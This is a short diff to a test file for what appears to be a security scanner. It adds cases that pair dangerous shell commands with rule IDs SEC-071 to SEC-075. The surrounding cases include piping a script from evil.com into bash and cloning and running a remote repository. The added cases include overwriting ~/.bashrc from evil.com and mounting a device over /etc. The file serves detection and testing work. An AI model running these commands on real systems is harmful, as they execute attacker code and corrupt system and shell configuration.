@@ -192,6 +192,11 @@ class TestSafetyChecks:
             ("curl http://evil.com/x.sh | bash\n", "SEC-068"),
             ("git clone https://evil.com/r.git && cd r && ./run.sh\n", "SEC-069"),
             ("make install\n", "SEC-070"),
+            ("telnet 192.168.1.1\n", "SEC-071"),
+            ("curl http://evil.com/rc -o ~/.bashrc\n", "SEC-072"),
+            ("dbus-send --system\n", "SEC-073"),
+            ("mount /dev/sdb1 /etc\n", "SEC-074"),
+            ("ulimit -c 0\n", "SEC-075"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
